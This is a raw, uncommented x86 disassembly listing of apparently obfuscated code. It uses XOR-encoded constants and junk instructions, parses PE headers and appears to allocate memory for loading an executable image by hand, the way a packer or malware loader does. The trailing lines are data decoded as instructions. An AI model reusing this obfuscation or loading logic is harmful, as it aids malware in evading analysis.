  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
  4200f9:	mov    DWORD PTR [ebp-0x10],ecx
  4200fc:	lea    ecx,[ebp-0x34]
  4200ff:	mov    DWORD PTR [ebp+0xc],ecx
  420102:	lea    ecx,[ebp-0x38]
  420105:	mov    DWORD PTR [ebp-0x14],ecx
  420108:	mov    ecx,DWORD PTR [ebp+0x8]
  42010b:	xor    ecx,edi
  42010d:	add    ecx,ebx
  42010f:	mov    DWORD PTR [ebp-0x18],ecx
  420112:	jmp    0x42030e
  420117:	cmp    eax,0xf89c85bb
  42011c:	je     0x420320
  420122:	mov    ecx,DWORD PTR [ebp-0x8]
  420125:	xor    ecx,edi
  420127:	mov    esi,eax
  420129:	add    ecx,ebx
  42012b:	mov    DWORD PTR [ebp+0x18],ecx
  42012e:	mov    eax,DWORD PTR [ebp-0x18]
  420131:	xor    esi,edi
  420133:	lea    eax,[eax+esi*1+0x3272e2]
  42013a:	mov    DWORD PTR [ebp-0x18],eax
  42013d:	mov    eax,DWORD PTR [ebp-0x8]
  420140:	mov    ecx,DWORD PTR [ebp-0x18]
  420143:	xor    eax,edi
  420145:	add    eax,ebx
  420147:	cmp    ecx,eax
  420149:	jne    0x42015e
  42014b:	mov    eax,DWORD PTR [ebp+0x8]
  42014e:	xor    eax,edi
  420150:	add    eax,ebx
  420152:	push   eax
  420153:	push   0xc
  420155:	lea    eax,[ebp-0x4c]
  420158:	push   eax
  420159:	call   0x41fb60
  42015e:	mov    eax,DWORD PTR [ebp-0xc]
  420161:	mov    eax,DWORD PTR [eax]
  420163:	xor    eax,edi
  420165:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42016c:	mov    ecx,DWORD PTR [ebp+0x8]
  42016f:	xor    ecx,edi
  420171:	movzx  eax,al
  420174:	add    ecx,ebx
  420176:	cmp    eax,ecx
  420178:	je     0x4202f6
  42017e:	mov    eax,DWORD PTR [ebp-0x10]
  420181:	mov    eax,DWORD PTR [eax]
  420183:	xor    eax,edi
  420185:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  42018c:	mov    ecx,DWORD PTR [ebp+0x8]
  42018f:	xor    ecx,edi
  420191:	movzx  eax,al
  420194:	add    ecx,ebx
  420196:	cmp    eax,ecx
  420198:	je     0x4202f6
  42019e:	mov    eax,DWORD PTR [ebp+0xc]
  4201a1:	mov    eax,DWORD PTR [eax]
  4201a3:	xor    eax,edi
  4201a5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ac:	mov    ecx,DWORD PTR [ebp+0x8]
  4201af:	xor    ecx,edi
  4201b1:	movzx  eax,al
  4201b4:	add    ecx,ebx
  4201b6:	cmp    eax,ecx
  4201b8:	je     0x4202f6
  4201be:	mov    eax,DWORD PTR [ebp-0x14]
  4201c1:	mov    eax,DWORD PTR [eax]
  4201c3:	xor    eax,edi
  4201c5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4201cf:	xor    ecx,edi
  4201d1:	movzx  eax,al
  4201d4:	add    ecx,ebx
  4201d6:	cmp    eax,ecx
  4201d8:	je     0x4202f6
  4201de:	mov    eax,DWORD PTR [ebp-0x10]
  4201e1:	mov    eax,DWORD PTR [eax]
  4201e3:	xor    eax,edi
  4201e5:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4201ec:	mov    ecx,DWORD PTR [ebp-0xc]
  4201ef:	mov    ecx,DWORD PTR [ecx]
  4201f1:	xor    ecx,edi
  4201f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4201fa:	xor    al,cl
  4201fc:	mov    ecx,DWORD PTR [ebp+0xc]
  4201ff:	mov    ecx,DWORD PTR [ecx]
  420201:	xor    ecx,edi
  420203:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42020a:	or     al,cl
  42020c:	mov    ecx,DWORD PTR [ebp-0xc]
  42020f:	mov    ecx,DWORD PTR [ecx]
  420211:	xor    ecx,edi
  420213:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42021a:	cmp    cl,al
  42021c:	jne    0x4202f6
  420222:	mov    eax,DWORD PTR [ebp+0xc]
  420225:	mov    eax,DWORD PTR [eax]
  420227:	xor    eax,edi
  420229:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420230:	mov    ecx,DWORD PTR [ebp-0x10]
  420233:	mov    ecx,DWORD PTR [ecx]
  420235:	xor    ecx,edi
  420237:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42023e:	xor    al,cl
  420240:	mov    ecx,DWORD PTR [ebp-0x14]
  420243:	mov    ecx,DWORD PTR [ecx]
  420245:	xor    ecx,edi
  420247:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  42024e:	or     al,cl
  420250:	mov    ecx,DWORD PTR [ebp-0x10]
  420253:	mov    ecx,DWORD PTR [ecx]
  420255:	xor    ecx,edi
  420257:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  42025e:	cmp    cl,al
  420260:	jne    0x4202f6
  420266:	mov    eax,DWORD PTR [ebp-0x14]
  420269:	mov    eax,DWORD PTR [eax]
  42026b:	xor    eax,edi
  42026d:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  420274:	mov    ecx,DWORD PTR [ebp+0xc]
  420277:	mov    ecx,DWORD PTR [ecx]
  420279:	xor    ecx,edi
  42027b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420282:	xor    al,cl
  420284:	mov    ecx,DWORD PTR [ebp-0xc]
  420287:	mov    ecx,DWORD PTR [ecx]
  420289:	xor    ecx,edi
  42028b:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  420292:	or     al,cl
  420294:	mov    ecx,DWORD PTR [ebp+0xc]
  420297:	mov    ecx,DWORD PTR [ecx]
  420299:	xor    ecx,edi
  42029b:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202a2:	cmp    cl,al
  4202a4:	jne    0x4202f6
  4202a6:	mov    eax,DWORD PTR [ebp-0x14]
  4202a9:	mov    eax,DWORD PTR [eax]
  4202ab:	xor    eax,edi
  4202ad:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4202b4:	mov    ecx,DWORD PTR [ebp-0xc]
  4202b7:	mov    ecx,DWORD PTR [ecx]
  4202b9:	xor    ecx,edi
  4202bb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202c2:	xor    al,cl
  4202c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4202c7:	mov    ecx,DWORD PTR [ecx]
  4202c9:	xor    ecx,edi
  4202cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  4202d2:	or     al,cl
  4202d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4202d7:	mov    ecx,DWORD PTR [ecx]
  4202d9:	xor    ecx,edi
  4202db:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  4202e2:	cmp    cl,al
  4202e4:	jne    0x4202f6
  4202e6:	lea    eax,[ebp-0x4c]
  4202e9:	push   eax
  4202ea:	call   0x41fdb1
  4202ef:	mov    ecx,DWORD PTR [ebp-0x44]
  4202f2:	cmp    eax,ecx
  4202f4:	je     0x420300
  4202f6:	mov    eax,DWORD PTR [ebp+0x8]
  4202f9:	xor    eax,edi
  4202fb:	add    eax,ebx
  4202fd:	mov    DWORD PTR [ebp+0x18],eax
  420300:	mov    eax,DWORD PTR [ebp-0x8]
  420303:	xor    eax,edi
  420305:	lea    eax,[eax+esi*1+0x3272e2]
  42030c:	xor    eax,edi
  42030e:	mov    ecx,DWORD PTR [ebp+0x8]
  420311:	mov    edx,DWORD PTR [ebp+0x18]
  420314:	xor    ecx,edi
  420316:	add    ecx,ebx
  420318:	cmp    edx,ecx
  42031a:	je     0x420117
  420320:	mov    eax,DWORD PTR [ebp+0x8]
  420323:	mov    ecx,DWORD PTR [ebp+0x18]
  420326:	xor    eax,edi
  420328:	add    eax,ebx
  42032a:	cmp    ecx,eax
  42032c:	jne    0x42033f
  42032e:	mov    eax,DWORD PTR [ebp-0x8]
  420331:	mov    ecx,DWORD PTR [ebp+0x1c]
  420334:	xor    eax,edi
  420336:	lea    eax,[eax+ecx*1+0x3272e2]
  42033d:	jmp    0x4203b6
  42033f:	push   0x18
  420341:	push   DWORD PTR [ebp-0x4]
  420344:	lea    eax,[ebp-0x64]
  420347:	push   eax
  420348:	call   0x41f5d3
  42034d:	mov    eax,DWORD PTR [ebp+0x8]
  420350:	mov    ecx,DWORD PTR [ebp-0x18]
  420353:	xor    eax,edi
  420355:	add    eax,ebx
  420357:	cmp    eax,ecx
  420359:	je     0x42036e
  42035b:	mov    eax,DWORD PTR [ebp+0x8]
  42035e:	xor    eax,edi
  420360:	add    eax,ebx
  420362:	push   eax
  420363:	push   0x18
  420365:	lea    eax,[ebp-0x64]
  420368:	push   eax
  420369:	call   0x41fb60
  42036e:	mov    eax,DWORD PTR [ebp-0x4]
  420371:	add    eax,0x18
  420374:	mov    DWORD PTR [ebp+0x18],eax
  420377:	push   DWORD PTR [ebp-0x50]
  42037a:	push   DWORD PTR [ebp+0x18]
  42037d:	mov    eax,DWORD PTR [ebp-0x54]
  420380:	add    eax,DWORD PTR [ebp-0x20]
  420383:	push   eax
  420384:	call   0x41f5d3
  420389:	mov    eax,DWORD PTR [ebp+0x8]
  42038c:	mov    ecx,DWORD PTR [ebp-0x18]
  42038f:	xor    eax,edi
  420391:	add    eax,ebx
  420393:	cmp    eax,ecx
  420395:	je     0x4203a8
  420397:	push   0x0
  420399:	push   DWORD PTR [ebp-0x50]
  42039c:	mov    eax,DWORD PTR [ebp-0x54]
  42039f:	add    eax,DWORD PTR [ebp-0x20]
  4203a2:	push   eax
  4203a3:	call   0x41fb60
  4203a8:	mov    eax,DWORD PTR [ebp-0x24]
  4203ab:	mov    ecx,DWORD PTR [ebp-0x50]
  4203ae:	add    DWORD PTR [eax],ecx
  4203b0:	mov    eax,DWORD PTR [ebp-0x50]
  4203b3:	add    eax,DWORD PTR [ebp+0x1c]
  4203b6:	mov    DWORD PTR [ebp+0x1c],eax
  4203b9:	mov    eax,DWORD PTR [ebp-0x8]
  4203bc:	mov    ecx,DWORD PTR [ebp+0x1c]
  4203bf:	xor    eax,edi
  4203c1:	add    eax,ebx
  4203c3:	imul   eax,ecx
  4203c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4203c9:	mov    edx,DWORD PTR [ebp-0x28]
  4203cc:	xor    ecx,edi
  4203ce:	lea    ecx,[ecx+edx*1+0x3272e2]
  4203d5:	cmp    eax,ecx
  4203d7:	jb     0x420035
  4203dd:	mov    esi,DWORD PTR [ebp+0x14]
  4203e0:	mov    eax,DWORD PTR [ebp-0x20]
  4203e3:	mov    DWORD PTR [esi],eax
  4203e5:	jmp    0x42042c
  4203e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4203ea:	mov    edx,DWORD PTR [ebp+0xc]
  4203ed:	xor    ecx,edi
  4203ef:	xor    edx,edi
  4203f1:	add    ecx,ebx
  4203f3:	add    edx,ebx
  4203f5:	cmp    ecx,edx
  4203f7:	jne    0x42040b
  4203f9:	mov    eax,ds:0x7f642d1e
  4203fe:	imul   eax,eax,0x9f15fcef
  420404:	mov    ds:0x7f642d1e,eax
  420409:	jmp    0x42042c
  42040b:	mov    ecx,DWORD PTR [ebp+0x8]
  42040e:	xor    ecx,edi
  420410:	add    ecx,ebx
  420412:	cmp    eax,ecx
  420414:	je     0x420422
  420416:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  420420:	jmp    0x42042c
  420422:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  42042c:	pop    edi
  42042d:	pop    esi
  42042e:	pop    ebx
  42042f:	leave  
  420430:	ret    0x18
  420433:	push   ebp
  420434:	mov    ebp,esp
  420436:	and    esp,0xfffffff8
  420439:	mov    eax,DWORD PTR [ebp+0x20]
  42043c:	sub    esp,0x14
  42043f:	push   ebx
  420440:	mov    ebx,DWORD PTR [ebp+0x14]
  420443:	push   esi
  420444:	push   edi
  420445:	cmp    eax,0xf89c8585
  42044a:	jne    0x420456
  42044c:	push   0xf89c8584
  420451:	jmp    0x420588
  420456:	mov    eax,DWORD PTR [ebp+0x20]
  420459:	cmp    eax,0xf89c8584
  42045e:	jne    0x42046a
  420460:	push   0xf89c85bb
  420465:	jmp    0x420588
  42046a:	mov    eax,DWORD PTR [ebp+0x20]
  42046d:	cmp    eax,0xf89c85bb
  420472:	jne    0x42047e
  420474:	push   0xf89c85ba
  420479:	jmp    0x420588
  42047e:	mov    eax,DWORD PTR [ebp+0x20]
  420481:	cmp    eax,0xf89c85ba
  420486:	jne    0x420492
  420488:	push   0xf89c85b9
  42048d:	jmp    0x420588
  420492:	mov    ecx,DWORD PTR [ebp+0x20]
  420495:	mov    eax,0xf89c85be
  42049a:	cmp    ecx,eax
  42049c:	jne    0x420558
  4204a2:	mov    eax,DWORD PTR [ebp+0x10]
  4204a5:	mov    DWORD PTR [esp+0xc],eax
  4204a9:	mov    eax,DWORD PTR [ebp+0x18]
  4204ac:	mov    DWORD PTR [esp+0x14],eax
  4204b0:	mov    eax,DWORD PTR [ebp+0xc]
  4204b3:	mov    DWORD PTR [esp+0x18],eax
  4204b7:	mov    eax,DWORD PTR [ebp+0x8]
  4204ba:	mov    DWORD PTR [esp+0x10],eax
  4204be:	mov    eax,DWORD PTR [esp+0x10]
  4204c2:	mov    ecx,DWORD PTR [esp+0x14]
  4204c6:	mov    edi,0x751089b
  4204cb:	xor    eax,edi
  4204cd:	mov    esi,0x3272e2
  4204d2:	add    eax,esi
  4204d4:	mov    DWORD PTR [ecx],eax
  4204d6:	mov    eax,DWORD PTR [esp+0xc]
  4204da:	mov    eax,DWORD PTR [eax+0x194]
  4204e0:	mov    ecx,DWORD PTR [eax]
  4204e2:	mov    eax,DWORD PTR [esp+0xc]
  4204e6:	mov    eax,DWORD PTR [eax+0x194]
  4204ec:	mov    eax,DWORD PTR [eax]
  4204ee:	add    eax,DWORD PTR [ecx+0x3c]
  4204f1:	mov    ecx,DWORD PTR [esp+0xc]
  4204f5:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4204fb:	mov    ecx,DWORD PTR [ecx+0x14]
  4204fe:	push   0x4
  420500:	push   0x3000
  420505:	push   DWORD PTR [eax+0x50]
  420508:	push   0x0
  42050a:	call   ecx
  42050c:	mov    DWORD PTR [ebx],eax
  42050e:	mov    eax,DWORD PTR [esp+0x10]
  420512:	push   DWORD PTR [esp+0xc]
  420516:	xor    eax,edi
  420518:	add    eax,esi
  42051a:	mov    DWORD PTR [esp+0x20],eax
  42051e:	lea    eax,[esp+0x20]
  420522:	push   eax
  420523:	push   ebx
  420524:	push   DWORD PTR [esp+0x20]
  420528:	push   DWORD PTR [esp+0x28]
  42052c:	push   DWORD PTR [esp+0x24]
  420530:	call   0x41fef5
  420535:	mov    eax,DWORD PTR [esp+0x10]
  420539:	mov    ecx,DWORD PTR [ebx]
  42053b:	xor    eax,edi
  42053d:	add    eax,esi
  42053f:	cmp    ecx,eax
  420541:	je     0x42059f
  420543:	mov    eax,DWORD PTR [esp+0x18]
  420547:	mov    ecx,DWORD PTR [esp+0x14]
  42054b:	xor    eax,edi
  42054d:	add    eax,esi
  42054f:	imul   eax,DWORD PTR [esp+0x1c]
  420554:	mov    DWORD PTR [ecx],eax
  420556:	jmp    0x42059f
  420558:	mov    ecx,DWORD PTR [ebp+0x20]
  42055b:	cmp    ecx,0xf89c85b9
  420561:	jne    0x42056a
  420563:	push   0xf89c85b8
  420568:	jmp    0x420588
  42056a:	mov    ecx,DWORD PTR [ebp+0x20]
  42056d:	cmp    ecx,0xf89c85b8
  420573:	jne    0x42057c
  420575:	push   0xf89c85bf
  42057a:	jmp    0x420588
  42057c:	mov    ecx,DWORD PTR [ebp+0x20]
  42057f:	cmp    ecx,0xf89c85bf
  420585:	jne    0x42059f
  420587:	push   eax
  420588:	push   DWORD PTR [ebp+0x1c]
  42058b:	push   DWORD PTR [ebp+0x18]
  42058e:	push   ebx
  42058f:	push   DWORD PTR [ebp+0x10]
  420592:	push   DWORD PTR [ebp+0xc]
  420595:	push   DWORD PTR [ebp+0x8]
  420598:	call   0x420433
  42059d:	mov    DWORD PTR [ebx],eax
  42059f:	mov    eax,DWORD PTR [ebx]
  4205a1:	pop    edi
  4205a2:	pop    esi
  4205a3:	pop    ebx
  4205a4:	mov    esp,ebp
  4205a6:	pop    ebp
  4205a7:	ret    0x1c
  4205aa:	push   ebp
  4205ab:	mov    ebp,esp
  4205ad:	sub    esp,0xc
  4205b0:	mov    eax,0xf89c8585
  4205b5:	mov    DWORD PTR [ebp-0x8],eax
  4205b8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4205bf:	mov    ecx,DWORD PTR [ebp-0x8]
  4205c2:	xor    ecx,0x751089b
  4205c8:	add    ecx,0x3272e2
  4205ce:	mov    DWORD PTR [ebp-0x4],ecx
  4205d1:	mov    ecx,DWORD PTR [ebp+0xc]
  4205d4:	push   eax
  4205d5:	mov    DWORD PTR [ebp+0xc],ecx
  4205d8:	push   DWORD PTR [ebp+0xc]
  4205db:	lea    eax,[ebp-0x4]
  4205de:	push   DWORD PTR [ebp+0x8]
  4205e1:	push   eax
  4205e2:	push   DWORD PTR [ebp+0xc]
  4205e5:	push   DWORD PTR [ebp-0xc]
  4205e8:	push   DWORD PTR [ebp-0x8]
  4205eb:	call   0x420433
  4205f0:	mov    DWORD PTR [ebp-0x4],eax
  4205f3:	mov    eax,DWORD PTR [ebp-0x4]
  4205f6:	leave  
  4205f7:	ret    0x8
  4205fa:	jg     0x4205b0
  4205fc:	jge    0xf741c5d1
  420602:	add    ebp,DWORD PTR [eax-0xa]
  420605:	dec    bp
  420607:	out    0xad,al
  420609:	mov    al,0x8
  42060b:	add    DWORD PTR [ecx],0x0
  42060e:	std    
  42060f:	add    DWORD PTR [eax],eax
  420611:	add    BYTE PTR ds:0xe0bebd0c,ch
  420617:	xor    al,0x4
  420619:	add    DWORD PTR [eax-0x6d1d0c30],ecx
  42061f:	jl     0x4205f9
  420621:	bound  esp,QWORD PTR [eax-0x41]
  420624:	fs dec ecx
  420626:	outs   dx,DWORD PTR ds:[esi]
  420627:	mov    ss,WORD PTR [edi-0x40]
  42062a:	rcl    DWORD PTR [edx-0xfeb8d60],0x74
  420631:	add    esp,DWORD PTR [edx]
  420633:	sbb    eax,0xe9976497
  420638:	jne    0x42060e
  42063a:	(bad)  
  42063b:	sub    DWORD PTR [ebx-0x5d1c2224],eax
  420641:	mov    edx,DWORD PTR [ebp+ecx*2+0x51]
  420645:	idiv   DWORD PTR [edx+0x13]
  420648:	scas   al,BYTE PTR es:[edi]
  420649:	dec    ecx
  42064a:	mov    ah,0x9
  42064c:	in     al,dx
  42064d:	int3   
  42064e:	jge    0x4205ea
  420650:	cs out dx,al
  420652:	cmp    eax,0x96f96b23
  420657:	adc    esp,DWORD PTR [edx-0x4]
  42065a:	scas   eax,DWORD PTR es:[edi]
  42065b:	or     ebp,0x651c363e
  420661:	mov    al,ds:0xb7d97008
  420666:	dec    edi
  420667:	jne    0x420683
  420669:	inc    ebx
  42066a:	xor    bl,BYTE PTR [ebx+0x30]
  42066d:	push   esi
  42066e:	pop    ds
  42066f:	xchg   ecx,eax
  420670:	pop    es
  420671:	das    
  420672:	jecxz  0x4206ee
  420674:	or     edx,ebx
  420676:	push   es
  420677:	out    0x3,al
  420679:	retf   
  42067a:	xor    ecx,ebx
  42067c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42067d:	dec    edi
  42067e:	outs   dx,DWORD PTR ds:[esi]
  42067f:	test   DWORD PTR ds:0xb9abc3eb,esi
